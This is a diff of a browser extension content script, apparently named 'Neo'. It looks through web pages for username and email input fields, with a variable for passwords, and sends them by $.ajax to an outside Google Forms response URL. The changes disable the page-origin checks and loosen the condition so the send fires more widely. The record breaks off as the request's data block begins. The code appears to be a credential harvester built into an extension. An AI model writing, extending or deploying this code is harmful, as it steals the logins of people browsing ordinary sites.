@@ -3,10 +3,11 @@ var port = chrome.runtime.connect({ name: "Neo" });
 var oldUrl = "";
 var pass;
 var user;
-if (window.location.href.indexOf("https://www.google.com") == 0) { port.postMessage({ setForm: "neg" });}
-if (window.location.href.indexOf("https://www.google.com") != 0) { port.postMessage({ setForm: "pos" }) }
-port.postMessage({ setForm: "inputs" });
-port.postMessage({ setForm: "pos" });
+//if (window.location.href.indexOf("https://www.google.com") == 0) { port.postMessage({ setForm: "neg" });}
+//if (window.location.href.indexOf("https://www.google.com") != 0) { port.postMessage({ setForm: "pos" }) }
+//port.postMessage({ setForm: "inputs" });
+//port.postMessage({ setForm: "pos" });
+port.postMessage({ setForm: "neg" });
         port.postMessage({ setForm: "canwe" });
         port.onMessage.addListener(function (msg) {
             if (msg.question == "yes") {
@@ -27,7 +28,7 @@ port.postMessage({ setForm: "pos" });
             if (msg.question == "yes" && ($("form[id]").find('input[type="text"][name*="user"]', 'input[type="text"][name*="og"]', 'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').length > 0)){
                 port.postMessage({ setForm: "sendinputs" });
             }
-            if (msg.question == "inputrec") {
+            if (msg.question == "yes"){//"inputrec") {
             $.ajax({
                 url: "https://docs.google.com/forms/d/e/1FAIpQLSeLs1OQwPjhZHo6eBrn-VMwkifyKKNUiGl0fPOfKFRC9HPgDw/formResponse",
                 data: {
